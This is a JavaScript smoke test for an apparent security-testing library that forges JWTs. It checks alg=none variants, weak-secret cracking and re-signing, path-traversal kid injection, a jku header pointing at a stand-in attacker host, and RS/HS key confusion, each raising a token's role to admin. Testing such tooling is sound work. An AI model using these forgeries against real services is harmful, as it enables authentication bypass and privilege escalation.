// Smoke test for the JWT forging primitive (lib/jwt-forge.mjs).
// Pure offline — constructs a known HS256 token in-process and asserts the
// forged variants are built correctly. No network, no Chrome, no worker.
import crypto from "node:crypto";
import { forgeJwt } from "./lib/jwt-forge.mjs";

let failures = 0;
function check(name, cond, detail = "") {
  if (cond) {
    console.log(`  ok    ${name}`);
  } else {
    console.log(`  FAIL  ${name}${detail ? " — " + detail : ""}`);
    failures++;
  }
}

// --- build a known HS256 token: secret='secret', payload {sub:'1',role:'user'} ---
const b64url = (obj) => Buffer.from(JSON.stringify(obj), "utf8").toString("base64url");
const hs256 = (input, secret) => crypto.createHmac("sha256", secret).update(input).digest("base64url");
const SECRET = "secret";
const knownHeader = { alg: "HS256", typ: "JWT" };
const knownPayload = { sub: "1", role: "user" };
const signingInput = `${b64url(knownHeader)}.${b64url(knownPayload)}`;
const knownToken = `${signingInput}.${hs256(signingInput, SECRET)}`;
console.log(`jwt-forge smoke: known token ${knownToken.slice(0, 48)}...`);

// helper: pull the payload object out of a forged variant's token
const decodePayload = (tok) => JSON.parse(Buffer.from(tok.split(".")[1], "base64url").toString("utf8"));
const decodeHeader = (tok) => JSON.parse(Buffer.from(tok.split(".")[0], "base64url").toString("utf8"));

// 1. forge with role->admin mutation, all attacks
const out = forgeJwt({ token: knownToken, mutations: { role: "admin" }, attackerJku: "https://evil.example/jwks.json" });
check("schema is jwt-forge.v1", out.schema === "agent-browser-runtime.jwt-forge.v1", out.schema);
check("original.alg parsed as HS256", out.original.alg === "HS256", out.original.alg);
check("original.signaturePresent true", out.original.signaturePresent === true);
check("mutationsApplied lists role", out.mutationsApplied.includes("role"), JSON.stringify(out.mutationsApplied));
check("boundary present and disclaims judgment", typeof out.boundary === "string" && out.boundary.includes("NOT a vulnerability judgment"));

// 2. every variant has attack/notes and (when a token exists) a 3-segment dotted token
check("every variant has attack+notes fields", out.variants.every((v) => typeof v.attack === "string" && typeof v.notes === "string"));
const tokVariants = out.variants.filter((v) => v.token != null);
check("each built token is 3-segment dotted", tokVariants.every((v) => v.token.split(".").length === 3), JSON.stringify(tokVariants.map((v) => v.token.split(".").length)));

// 3. none variant: header.alg==='none' and signature segment empty
const noneVars = out.variants.filter((v) => v.attack === "none");
const noneLower = noneVars.find((v) => decodeHeader(v.token).alg === "none");
check("none variant exists with alg=none", !!noneLower, JSON.stringify(noneVars.map((v) => decodeHeader(v.token).alg)));
check("none variant signature segment empty", !!noneLower && noneLower.token.split(".")[2] === "", noneLower ? JSON.stringify(noneLower.token.split(".")[2]) : "no none var");
check("none case-spelling variants present (None/NONE)", noneVars.some((v) => decodeHeader(v.token).alg === "None") && noneVars.some((v) => decodeHeader(v.token).alg === "NONE"));

// 4. weak-secret cracks 'secret' (it is in the default wordlist) and re-signs verifiably
const weak = out.variants.find((v) => v.attack === "weak-secret");
check("weak-secret variant exists", !!weak);
check("weak-secret notes report cracked secret='secret'", !!weak && weak.notes.includes('secret="secret"'), weak ? weak.notes : "none");
let weakVerifies = false;
if (weak) {
  const [h, p, s] = weak.token.split(".");
  weakVerifies = hs256(`${h}.${p}`, SECRET) === s;
}
check("weak-secret re-signed token verifies under HS256 with 'secret'", weakVerifies);

// 5. mutation applied: forged payloads carry role==='admin'
check("mutated variants carry payload.role=admin", tokVariants.every((v) => decodePayload(v.token).role === "admin"), JSON.stringify(tokVariants.map((v) => decodePayload(v.token).role)));

// 6. kid-injection: some variant's header.kid contains an injection string
const kidVars = out.variants.filter((v) => v.attack === "kid-injection");
check("kid-injection produced variants", kidVars.length >= 1, `count=${kidVars.length}`);
check("a kid-injection variant carries path-traversal kid", kidVars.some((v) => decodeHeader(v.token).kid === "../../../../dev/null"), JSON.stringify(kidVars.map((v) => decodeHeader(v.token).kid)));

// 7. jku-spoof: header.jku === attackerJku
const jku = out.variants.find((v) => v.attack === "jku-spoof");
check("jku-spoof variant exists", !!jku);
check("jku-spoof header.jku === attackerJku", !!jku && decodeHeader(jku.token).jku === "https://evil.example/jwks.json", jku ? decodeHeader(jku.token).jku : "none");

// 8. hs-confusion without publicKeyPem is skipped with a note (token null)
const hsSkip = out.variants.find((v) => v.attack === "hs-confusion");
check("hs-confusion skipped without publicKeyPem (token null + note)", !!hsSkip && hsSkip.token === null && hsSkip.notes.includes("publicKeyPem required"), hsSkip ? hsSkip.notes : "none");

// 9. hs-confusion WITH a public key builds an HS256 token signed by the PEM string
const { publicKey } = crypto.generateKeyPairSync("rsa", { modulusLength: 2048 });
const pubPem = publicKey.export({ type: "spki", format: "pem" }).toString();
const out2 = forgeJwt({ token: knownToken, attacks: ["hs-confusion"], publicKeyPem: pubPem });
const hsConf = out2.variants.find((v) => v.attack === "hs-confusion");
let hsConfOk = false;
if (hsConf && hsConf.token) {
  const [h, p, s] = hsConf.token.split(".");
  hsConfOk = decodeHeader(hsConf.token).alg === "HS256" && hs256(`${h}.${p}`, pubPem) === s;
}
check("hs-confusion with PEM builds HS256 token signed by the PEM string", hsConfOk);

// 10. attacks filter is honoured (only the requested family is emitted)
const out3 = forgeJwt({ token: knownToken, attacks: ["none"] });
check("attacks filter limits output to requested family", out3.variants.every((v) => v.attack === "none") && out3.variants.length >= 1);

// 11. missing token throws
let threw = false;
try { forgeJwt({}); } catch { threw = true; }
check("missing token throws", threw);

console.log(failures === 0 ? "jwt-forge smoke: PASS" : `jwt-forge smoke: ${failures} FAILURE(S)`);
process.exit(failures === 0 ? 0 : 1);
